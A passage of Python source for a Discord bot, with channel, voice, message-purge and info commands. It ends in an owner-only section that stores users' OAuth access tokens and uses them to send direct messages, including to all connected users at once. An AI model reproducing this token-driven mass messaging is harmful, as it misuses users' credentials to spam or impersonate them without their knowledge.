    if ch_type not in ('text', 'voice'):
        return await ctx.send(embed=eb('❌ Error', 'Type must be `text` or `voice`', C_ERR))
    msg = await ctx.send(embed=eb('⏳ Creating…', f'Creating {count} {ch_type} channel(s)…', C_CHAN))
    created = []
    for idx in range(1, count + 1):
        ch_name = name if count == 1 else f'{name}-{idx}'
        try:
            if ch_type == 'text':
                ch = await ctx.guild.create_text_channel(ch_name, reason=f'by {ctx.author}')
                created.append(ch.mention)
            else:
                ch = await ctx.guild.create_voice_channel(ch_name, reason=f'by {ctx.author}')
                created.append(f'🔊 {ch.name}')
        except discord.Forbidden: break
        await asyncio.sleep(0.5)
    e = eb(f'✅ Created {len(created)} channel(s)', ' '.join(created[:20]), C_CHAN)
    if len(created) > 20: e.description += f'\n… and {len(created)-20} more'
    await msg.edit(embed=e)


@bot.command(name='deletechannel', aliases=['dch'])
async def cmd_dch(ctx, channel: discord.TextChannel = None):
    ch   = channel or ctx.channel
    name = ch.name
    await ch.delete(reason=f'by {ctx.author}')
    if ch != ctx.channel:
        await ctx.send(embed=eb('✅ Channel Deleted', f'**{name}** deleted!', C_OK))

@cmd_dch.error
async def dch_err(ctx, e):
    if isinstance(e, commands.ChannelNotFound):
        await ctx.send(embed=eb('❌ Error', 'Channel not found!', C_ERR))

# ─────────────────────────────────────────────────────────────
#  COMMANDS — VOICE
# ─────────────────────────────────────────────────────────────
@bot.command(name='connectvc', aliases=['vc'])
async def cmd_vc(ctx):
    if not ctx.author.voice:
        return await ctx.send(embed=eb('❌ Error', 'You are not in a voice channel!', C_ERR))
    ch = ctx.author.voice.channel
    vc = ctx.voice_client
    if vc: await vc.move_to(ch)
    else:  await ch.connect()
    await ctx.guild.change_voice_state(channel=ch, self_mute=True, self_deaf=True)
    voice_inviter[ctx.guild.id] = ctx.author.id
    await ctx.send(embed=eb('🔊 Joined Voice',
                            f'Joined **{ch.name}** — will leave when you do!', C_VOICE))


@bot.command(name='joinvoiceid', aliases=['jv'])
async def cmd_jv(ctx, channel_id: int = None):
    if not channel_id:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!jv channel_id`', C_ERR))
    ch = ctx.guild.get_channel(channel_id)
    if not isinstance(ch, discord.VoiceChannel):
        return await ctx.send(embed=eb('❌ Error', 'No voice channel found with that ID!', C_ERR))
    vc = ctx.voice_client
    if vc: await vc.move_to(ch)
    else:  await ch.connect()
    await ctx.guild.change_voice_state(channel=ch, self_mute=True, self_deaf=True)
    voice_inviter[ctx.guild.id] = ctx.author.id
    await ctx.send(embed=eb('🔊 Joined Voice', f'Joined **{ch.name}**!', C_VOICE))


@bot.command(name='leavevoice', aliases=['lv'])
async def cmd_lv(ctx):
    if not ctx.voice_client:
        return await ctx.send(embed=eb('❌ Error', 'Bot is not in any voice channel!', C_ERR))
    name = ctx.voice_client.channel.name
    voice_inviter.pop(ctx.guild.id, None)
    await ctx.voice_client.disconnect()
    await ctx.send(embed=eb('👋 Left', f'Left **{name}**!', C_VOICE))


@bot.command(name='voicekick', aliases=['vk'])
async def cmd_vk(ctx, member: discord.Member = None):
    if not member:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!vk @user`', C_ERR))
    if not member.voice:
        return await ctx.send(embed=eb('⚠️ Warning',
                                       f'**{member.display_name}** is not in a voice channel!', C_WARN))
    ch = member.voice.channel.name
    await member.move_to(None, reason=f'by {ctx.author}')
    await ctx.send(embed=eb('🔇 Voice Kicked',
                            f'**{member.display_name}** removed from **{ch}**!', C_VOICE))

# ─────────────────────────────────────────────────────────────
#  COMMANDS — OTHER
# ─────────────────────────────────────────────────────────────
@bot.command(name='mention', aliases=['mn'])
async def cmd_mention(ctx, target: str = None, *, message: str = ''):
    if not target:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!mn @user/role message`', C_ERR))
    try:
        uid = strip_id(target)
        member = ctx.guild.get_member(uid)
        role   = ctx.guild.get_role(uid)
        mention_str = member.mention if member else (role.mention if role else f'<@{uid}>')
    except:
        mention_str = target
    content = f'{mention_str} {message}' if message else mention_str
    await ctx.message.delete()
    await ctx.send(content)


@bot.command(name='clear', aliases=['c'])
async def cmd_clear(ctx, amount: int = None):
    if amount is None:
        return await ctx.send(embed=eb('❌ Error', 'Usage: `!c 100`', C_ERR))
    if amount < 1:
        return await ctx.send(embed=eb('❌ Error', 'Amount must be at least 1!', C_ERR))
    await ctx.message.delete()
    progress = await ctx.send(embed=eb('🗑️ Deleting…', f'Deleting {amount} message(s)…', C_CLR))
    total = 0
    remaining = amount
    while remaining > 0:
        batch = min(remaining, 100)
        try:
            deleted = await ctx.channel.purge(limit=batch, before=progress)
            count = len(deleted)
            if count == 0: break
            total     += count
            remaining -= count
            if total % 500 == 0:
                await progress.edit(embed=eb('🗑️ Deleting…', f'Deleted `{total}` so far…', C_CLR))
            if count < batch: break
        except discord.HTTPException:
            await asyncio.sleep(1)
    try:
        await progress.edit(embed=eb('✅ Done', f'Deleted **{total}** message(s)!', C_OK))
        await progress.delete(delay=4)
    except: pass


@bot.command(name='serverinfo', aliases=['si'])
async def cmd_si(ctx):
    g = ctx.guild
    e = discord.Embed(title=f'📊 {g.name}', color=C_INFO, timestamp=datetime.datetime.utcnow())
    if g.icon: e.set_thumbnail(url=g.icon.url)
    e.add_field(name='👑 Owner',   value=g.owner.mention if g.owner else '?', inline=True)
    e.add_field(name='👥 Members', value=str(g.member_count),                 inline=True)
    e.add_field(name='🆔 ID',      value=str(g.id),                           inline=True)
    e.add_field(name='💬 Text',    value=str(len(g.text_channels)),           inline=True)
    e.add_field(name='🔊 Voice',   value=str(len(g.voice_channels)),          inline=True)
    e.add_field(name='🏅 Roles',   value=str(len(g.roles)),                   inline=True)
    e.add_field(name='📅 Created', value=g.created_at.strftime('%Y-%m-%d'),   inline=True)
    await ctx.send(embed=e)


@bot.command(name='userinfo', aliases=['ui'])
async def cmd_ui(ctx, member: discord.Member = None):
    member = member or ctx.author
    e = discord.Embed(title=f'👤 {member.display_name}',
                      color=member.color.value if member.color.value else C_INFO,
                      timestamp=datetime.datetime.utcnow())
    e.set_thumbnail(url=member.display_avatar.url)
    e.add_field(name='🏷️ Username', value=str(member),        inline=True)
    e.add_field(name='🆔 ID',       value=str(member.id),     inline=True)
    e.add_field(name='🤖 Bot?',     value='Yes' if member.bot else 'No', inline=True)
    e.add_field(name='📅 Joined',   value=member.joined_at.strftime('%Y-%m-%d') if member.joined_at else '?', inline=True)
    e.add_field(name='📅 Created',  value=member.created_at.strftime('%Y-%m-%d'), inline=True)
    roles = [r.mention for r in reversed(member.roles) if r.name != '@everyone']
    e.add_field(name=f'🏅 Roles ({len(roles)})', value=' '.join(roles[:10]) or 'None', inline=False)
    if member.id == OWNER_ID:          e.add_field(name='⭐', value='👑 Bot Owner', inline=False)
    elif member.id in trusted_users:   e.add_field(name='⭐', value='⭐ Trusted',   inline=False)
    await ctx.send(embed=e)

# ─────────────────────────────────────────────────────────────
#  COMMANDS — OAUTH2 USER CONTROL (owner only)
# ─────────────────────────────────────────────────────────────
@bot.command(name='users')
async def cmd_users(ctx):
    if ctx.author.id != OWNER_ID: return await ctx.reply("Only owner!")
    e = discord.Embed(title="👥 OAuth2 Users", color=C_INFO)
    e.add_field(name="Total", value=str(len(user_tokens)), inline=True)
    if user_tokens:
        top = list(user_tokens.items())[:5]
        lines = [f"<@{uid}> — **{info.get('username','?')}**" for uid, info in top]
        e.add_field(name="Recent", value='\n'.join(lines), inline=False)
    e.add_field(name="Web Panel", value=f"http://0.0.0.0:{PORT}/panel", inline=False)
    await ctx.reply(embed=e)


@bot.command(name='msgtouser', aliases=['mtu'])
async def cmd_msgtouser(ctx, user_id: int = None, *, message: str = None):
    if ctx.author.id != OWNER_ID: return await ctx.reply("Only owner!")
    if not user_id or not message: return await ctx.reply("Use: `!mtu <id> <msg>`")
    if user_id not in user_tokens: return await ctx.reply("User not connected via OAuth2!")
    headers = {'Authorization': f'Bearer {user_tokens[user_id]["access"]}', 'Content-Type': 'application/json'}
    try:
        r = req_lib.post(f'{DISCORD_API}/users/@me/channels',
                         json={'recipient_id': str(user_id)}, headers=headers)
        if r.ok:
            cid = r.json()['id']
            r2  = req_lib.post(f'{DISCORD_API}/channels/{cid}/messages',
                               json={'content': message}, headers=headers)
            await ctx.reply("✅ Sent!" if r2.ok else f"❌ Failed: {r2.status_code}")
        else: await ctx.reply(f"❌ Failed: {r.status_code}")
    except Exception as ex: await ctx.reply(f"❌ {str(ex)[:80]}")


@bot.command(name='msgall')
async def cmd_msgall(ctx, *, message: str = None):
    if ctx.author.id != OWNER_ID: return await ctx.reply("Only owner!")
    if not message: return await ctx.reply("Use: `!msgall <msg>`")
    sent = 0; fail = 0
    status = await ctx.reply(f"📨 Sending to {len(user_tokens)} users…")
    for uid, td in user_tokens.items():
        try:
            headers = {'Authorization': f'Bearer {td["access"]}', 'Content-Type': 'application/json'}
            r = req_lib.post(f'{DISCORD_API}/users/@me/channels',
                             json={'recipient_id': str(uid)}, headers=headers)
            if r.ok:
                req_lib.post(f'{DISCORD_API}/channels/{r.json()["id"]}/messages',
                             json={'content': message}, headers=headers)
                sent += 1
            else: fail += 1
        except: fail += 1
    await status.edit(content=f"✅ Sent to {sent} | ❌ Failed: {fail}")


@bot.command(name='removeuser', aliases=['rmuser'])
async def cmd_removeuser(ctx, user_id: int = None):
    if ctx.author.id != OWNER_ID: return await ctx.reply("Only owner!")
    if not user_id: return await ctx.reply("Use: `!removeuser <id>`")
    if user_id not in user_tokens: return await ctx.reply("Not found!")
    del user_tokens[user_id]; save_tokens()
    await ctx.reply(f"✅ Removed `{user_id}` from OAuth2 users")


@bot.command(name='usercmds')
async def cmd_usercmds(ctx):
    if ctx.author.id != OWNER_ID: return await ctx.reply("Only owner!")
    e = discord.Embed(title="👥 OAuth2 User Control", color=0xFF0000)
    e.add_field(name="!users",              value="List connected OAuth2 users",   inline=False)
    e.add_field(name="!mtu <id> <msg>",     value="DM a specific user",            inline=False)
    e.add_field(name="!msgall <msg>",       value="DM all connected users",        inline=False)
    e.add_field(name="!removeuser <id>",    value="Remove user from OAuth2 list",  inline=False)
    e.add_field(name="!usercmds",           value="This help menu",                inline=False)
    await ctx.reply(embed=e)

# ─────────────────────────────────────────────────────────────
#  START
# ─────────────────────────────────────────────────────────────
if __name__ == '__main__':
    keep_alive()
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"[ERROR] {e}")
        import time
        while True:
            time.sleep(60)
